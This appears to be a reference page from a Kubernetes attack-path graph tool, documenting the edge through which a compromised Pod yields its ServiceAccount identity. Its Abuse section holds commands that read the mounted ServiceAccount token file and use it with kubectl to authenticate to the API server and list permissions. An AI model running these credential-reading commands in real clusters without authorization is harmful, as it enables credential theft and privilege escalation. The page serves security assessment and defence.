# compromiseServiceAccount

## Edge Schema

- **Source:** [Pod](../NodeDescriptions/Pod.md)
- **Target:** [Identity](../NodeDescriptions/Identity.md)

## General Information

The Pod mounts a ServiceAccount token, meaning compromise of any container in the Pod yields the ServiceAccount's credentials and all associated permissions.

## Abuse

The ServiceAccount token is automatically mounted at a well-known path inside the container. Read it and use it to authenticate to the API server to assume the ServiceAccount's permissions. The default ServiceAccount in most namespaces has minimal permissions, so always run `auth can-i --list` with the token before assuming it is high-value. The interesting cases are pods explicitly assigned a named ServiceAccount with broader RBAC.

```bash
# Read the mounted token from within the container
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use the token to authenticate to the API server
kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
  --server=https://kubernetes.default.svc \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  auth can-i --list
```

## References

- [Kubernetes Service Account Tokens](https://kubernetes.io/docs/concepts/security/service-accounts/#authenticating-as-a-service-account)
- [OWASP K02 - Overly Permissive Authorization Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K02-Overly-Permissive-Authorization-Configurations.html)
- [Threat Matrix - Container Service Account](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Container%20service%20account/)
